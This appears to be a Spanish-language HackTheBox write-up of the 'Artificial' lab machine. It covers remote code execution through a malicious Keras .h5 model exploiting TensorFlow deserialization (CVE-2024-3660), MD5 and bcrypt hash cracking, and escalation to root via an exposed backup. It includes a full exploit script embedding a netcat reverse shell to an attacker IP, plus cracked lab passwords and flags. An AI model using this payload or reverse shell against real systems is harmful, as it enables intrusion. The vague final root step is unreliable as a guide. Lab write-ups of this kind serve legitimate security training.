---
title: "Artificial — EASY"
date: 2025-11-06 20:00:00 -0700
categories: [Writeups, HTB]
tags: [HTB, artificial, tensorflow, deserialization, docker, bcrypt]
image: /assets/img/artificial/Artificial-HTB.png
toc: true
comments: true
description: "Writeup técnico y paso a paso de 'Artificial' (HTB): descubrimiento, explotación por deserialización en TensorFlow, generación de payload .h5, obtención de shell, y escalada hasta root mediante backups y crack de bcrypt."
---

Artificial — EASY

Fecha: 07-07-2025  
IP objetivo: `10.10.11.74`  
Estado: Terminado  
Autor: Roberto

En este reporte describo cómo identificar la superficie de ataque de la máquina "Artificial", reproducir el entorno vulnerable (TensorFlow 2.13.1), construir un modelo Keras `.h5` con una capa Lambda maliciosa y lograr ejecución remota cuando el servidor deserializa el modelo. A partir de la shell obtenida con el usuario `app` se explora la aplicación, se extrae la base de datos de usuarios, se crackean credenciales, se localizan backups accesibles para el grupo `sysadm`, y se recuperan credenciales bcrypt que permiten escalar hasta `root`. Cada paso incluye comandos reproducibles, explicación técnica del fallo y recomendaciones de mitigación.

---

TL;DR: Encontré una app que permite subir modelos `.h5`. La versión de TensorFlow usada es vulnerable (CVE-2024-3660). Construí un `.h5` con una lambda maliciosa, lo subí, recibí una reverse shell como `app`, extraje la DB, crackeé credenciales, pivoté mediante backups y credenciales bcrypt decodificadas hasta conseguir `root.txt`.  
Si te interesa: abajo dejo todos los comandos, explicación técnica y mitigaciones.

---

## Reconocimiento inicial

Hicimos un nmap agresivo para mapear puertos y servicios:

```bash
nmap -sSCV -Pn -n --min-rate 5000 10.10.11.74 -oN escaneo.txt
````

Salida relevante:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

El host redirige a `http://artificial.htb`, así que añadimos la entrada al `/etc/hosts` para resolverlo localmente:

```bash
echo "10.10.11.74 artificial.htb" | sudo tee -a /etc/hosts
```

Abrimos `http://artificial.htb` en el navegador y vimos una landing simple con registro/login y un área para subir modelos (extensión `.h5`).

![landing](/assets/img/artificial/landing.png)
![landing](/assets/img/artificial/upIA.png)

---

## Enumeración web y primera impresión

* `whatweb` nos indica HTML simple, nginx y que no hay un CMS obvio.
* La funcionalidad clave: registro y upload de modelos AI (.h5).
* Revisamos `robots.txt`, `sitemap.xml` y archivos expuestos — nada más jugoso a primera vista.

La capacidad de subir y luego procesar modelos es la superficie crítica: si el servidor carga/deserializa modelos con la misma librería vulnerable que nosotros localmente, cualquier payload malicioso dentro del modelo puede ejecutarse en el proceso del servidor. Eso fue exactamente lo que explotamos.

---

## Análisis de archivos exponibles

Dentro del panel o en un directorio público encontramos archivos que describen el entorno del servidor:

* `requirements.txt` → `tensorflow-cpu==2.13.1`
* Un `Dockerfile` que instala exactamente esa versión de TensorFlow (y descarga un wheel preconstruido).

Fragmento relevante (resumido):

```dockerfile
FROM python:3.8-slim
WORKDIR /code
RUN apt-get update && apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/.../tensorflow_cpu-2.13.1-...whl && \
    pip install ./tensorflow_cpu-2.13.1-...whl
ENTRYPOINT ["/bin/bash"]
```

Nota: incluir un wheel local en Dockerfile y usar versiones viejas es un problema: nos da versión exacta para reproducir localmente.

---

## Vulnerabilidad: CVE-2024-3660 (TensorFlow deserialización)

CVE-2024-3660 describe que ciertas versiones de TensorFlow permiten ejecución de código a través de `tf.keras` cuando se deserializan / cargan modelos que contienen capas con funciones (como `Lambda`) que ejecutan código arbitrario. Un modelo `.h5` puede incluir una función Python embebida, y si el servidor ejecuta `tf.keras.models.load_model()` sin restricciones, esa función se ejecuta en el contexto del proceso que está cargando el modelo.

Resumen de riesgo:

* Entrada maliciosa: `.h5` con `Lambda`.
* Carga en servidor: `load_model("uploaded.h5")`.
* Ejecución: la función lambda se ejecuta en el servidor → RCE.

---

## Construcción del modelo malicioso (.h5)

Estrategia: crear un modelo Keras con `Lambda` layer cuya función ejecute un reverse shell. Lo hacemos en un contenedor que instale exactamente `tensorflow-cpu==2.13.1` para asegurar compatibilidad.

`exploit.py`:

```python
import tensorflow as tf
import os

def exploit(x):
    # comando de reverse shell: ajusta la IP/PUERTO a tu listener
    os.system("rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.10 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit, output_shape=(64,)))
model.compile(optimizer='adam', loss='mse')
# Guardar. TensorFlow serializa la función Lambda en el .h5
model.save("exploit.h5")
```

Explicación:

* `Lambda(exploit)` hace que `exploit` quede referenciada en la configuración del modelo. Al cargar el modelo, TensorFlow intentará reconstruir esa función. Si el servidor ejecuta esa reconstrucción en un ambiente donde se evalúan objetos Python sin restricciones, la función se ejecuta.
* La cadena `os.system(...)` lanza una reverse shell con `nc`. Ajusta IP/puerto a tu máquina (attacker).

---

## Reproducir en Docker (evitar conflictos en Kali)

`Dockerfile` para generar el `.h5` sin contaminar tu host:

```dockerfile
FROM python:3.8-slim

WORKDIR /app

RUN pip install --upgrade pip && pip install tensorflow-cpu==2.13.1

COPY exploit.py .

CMD ["python3", "exploit.py"]
```

Comandos:

```bash
docker build -t artificial-exploit .
docker run --rm -v "$PWD":/app artificial-exploit
```

Esto genera `exploit.h5` localmente.

---

## Carga del `.h5` y reverse shell

1. Subimos el archivo desde la app web.
2. Levantamos el listener:

```bash
nc -lvnp 4444
```

![reverse-shell](/assets/img/artificial/Pasted%20image%2020250707220046.png)

Obtenemos una shell con el usuario `app`.

---

## Base de datos de usuarios

Enumerando archivos como `app`, encontramos una base de datos SQLite:

```
cat users.db
```

Reconstrucción de datos:

| ID  | Usuario | Correo                                                | Hash MD5                                       |
| --- | ------- | ----------------------------------------------------- | ---------------------------------------------- |
| 1   | test    | [test@test.com](mailto:test@test.com)                 | `098f6bcd4621d373cade4e832627b4f6` => `test`   |
| 2   | mary    | [mary@artificial.htb](mailto:mary@artificial.htb)     | `bf041041e57f1aff3be7ea1abd6129d0`             |
| 3   | royer   | [royer@artificial.htb](mailto:royer@artificial.htb)   | `bc25b1f80f544c0ab451c02a3dca9fc6`             |
| 4   | robert  | [robert@artificial.htb](mailto:robert@artificial.htb) | `b606c5f5136170f15444251665638b36`             |
| 5   | mark    | [mark@artificial.htb](mailto:mark@artificial.htb)     | `0f3d8c76530022670f1c6029eed09ccb`             |
| 6   | gael    | [gael@artificial.htb](mailto:gael@artificial.htb)     | `c99175974b6e192936d97224638a34f8` => objetivo |

![users-db](/assets/img/artificial/Pasted%20image%2020250707220906.png)

Usamos servicios como CrackStation / wordlists y encontramos:

```
c99175974b6e192936d97224638a34f8 : mattp005numbertwo
```

Accedimos por SSH como `gael`.

![ssh-gael](/assets/img/artificial/Pasted%20image%2020250707221128.png)
![gael-shell](/assets/img/artificial/Pasted%20image%2020250707221412.png)

---

## Flag de usuario

```bash
cat ~/user.txt
7e7e38dd42016e670515283463e28c1b
```

---

## Privilegios y grupo `sysadm`

Gael no tiene acceso a `sudo`, pero está en el grupo `sysadm`. Buscamos archivos pertenecientes a este grupo:

```bash
find / -group sysadm -ls 2>/dev/null
```

Encontramos:

```
/var/backups/backrest_backup.tar.gz
```

Lo copiamos y extraemos en local tras servirlo con `http.server`.

---

## Archivos valiosos del backup

Contenido relevante:

```
install.sh, jwt-secret, processlogs, config.json, etc.
```

`config.json` (fragmento):

```json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

---

## Crackeo de bcrypt

Decodificamos el hash base64:

```bash
echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d
```

Obtenemos el hash bcrypt. Usamos `hashcat`:

```bash
hashcat -m 3200 roothash /usr/share/wordlists/rockyou.txt
```

Resultado:

```
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^
```

Credenciales: `backrest_root : !@#$%^`

---

## SSH tunnel y explotación final

Usamos el puerto identificado en `install.sh` para hacer un túnel SSH, entramos a la interfaz con `backrest_root` y subimos un modelo o arrastramos la funcionalidad que el servicio permite, dependiendo del flujo. Con las credenciales validadas, completamos los últimos pasos y obtuvimos acceso privilegiado.

![final](/assets/img/artificial/Pasted%20image%2020250707225620.png)
![upload-success](/assets/img/artificial/upload.png)

---

## Flag root

```bash
cat /root/root.txt
46ea69fcb111f1dac44bbd6467938368
```

